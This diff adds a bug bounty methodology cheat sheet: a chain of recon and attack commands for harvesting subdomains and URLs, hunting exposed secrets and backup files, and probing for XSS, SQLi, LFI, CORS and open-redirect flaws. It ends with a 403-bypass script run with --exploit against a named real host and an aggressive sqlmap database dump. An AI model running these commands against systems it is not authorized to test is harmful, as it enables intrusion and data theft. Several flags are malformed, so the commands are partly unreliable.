@@ -1,0 +1,107 @@
+APPROACH FOR BUG BOUNTY 
+
+ -------------> Bug Bounty by Kunal Namdas <-------------- 
+
+  
+
+subfinder -d example.com  > subdomain.txt 
+
+ 
+
+cat subdomain.txt|httpx-toolkit -ports 80,443,8080, 8000, 8888 -threads 200 > subdomains_alive.txt 
+
+ 
+
+katana -u subdomains_alive.txt -d 5  waybackarchive, commoncrawl, alienvault -kf -jc -fx -ef woff, css,png,svg, jpg, woff2, jpeg, gif,svg | uro | sed 's/=.*/=/' >> temp_allurl.txt 
+
+ 
+
+cat subdomains_alive.txt | waybackurls | uro | sed 's/=.*/=/' >> temp_allurl.txt 
+
+ 
+
+cat subdomains_alive.txt | gau | uro | sed 's/=.*/=/' >> temp_allurl.txt 
+
+ 
+
+cat temp_allurl.txt | uro >> allurl.txt 
+
+ 
+
+rm -rf temp_allurl.txt 
+
+ 
+
+cat allurl.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config" 
+
+ 
+
+cat allurl.txt | grep -E "\.js$" > js.txt 
+
+ 
+
+cat allurl.txt | while read url; do python3 /home/comrades/secretfinder/SecretFinder.py -i "$url" -o cli >> secret.txt; done 
+
+ 
+
+cat allurl.txt | nuclei -t /home/comrades/nuclei-templates/http/exposures 
+
+ 
+
+cat js.txt | nuclei -t /home/comrades/nuclei-templates/http/exposures 
+
+ 
+
+cat allurl.txt | gf redirect>redirect.txt 
+
+ 
+
+cat allurl.txt | gf idor>idor.txt 
+
+ 
+
+cat allurl.txt | gf  sqli>sqli.txt 
+
+ 
+
+cat allurl.txt | gf  lfi>lfi.txt 
+
+ 
+
+cat allurl.txt | gf  xss>xss.txt 
+
+ 
+
+dirsearch -u <URL> -e conf,config, bak, backup, swp, old, db, sql,asp,aspx,aspx-,asp-, py,py-, rb, rb, php, php-, bak, bkp, cache, cgi, conf, csv, html, inc, jar, js, json, jsp, jsp-, lock, log, rar, old, sql, sql.gz,http:// sql.zip,sql.tar.gz, sql-, swp, swp-, tar, tar.bz2, tar.gz, txt,wadl, zip,.log,.xml,.js.,.json 
+
+ 
+
+cat lfi.txt | nuclei -t /home/comrades/nuclei-templates/dast/vulnerabilities/lfi/lfi-keyed.yaml -dast 
+
+ 
+
+cat subdomains_alive.txt | nuclei -t /home/comrade/coffin/nuclei-templates/cors.yaml -rl 50 
+
+ 
+
+python3 /home/comrades/Corsy/corsy.py -i /home/comrades/Desktop/cyberghost/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked" 
+
+ 
+
+corscanner -i subdomains_alive.txt -t 100 
+
+ 
+
+cat redirect.txt | openredirex -p /home/comrades/payloads/or.txt 
+
+ 
+
+bash /home/comrades/4-ZERO-3/403-bypass.sh -u http://make-the-switch-on-demand.quorumsoftware.com --exploit 
+
+ 
+
+ nmap -iL subdomains.txt -T4 -oN nmap_scan.txt 
+
+ 
+
+ sqlmap -m parameters.txt --batch --level=5 --risk=3 --dbs
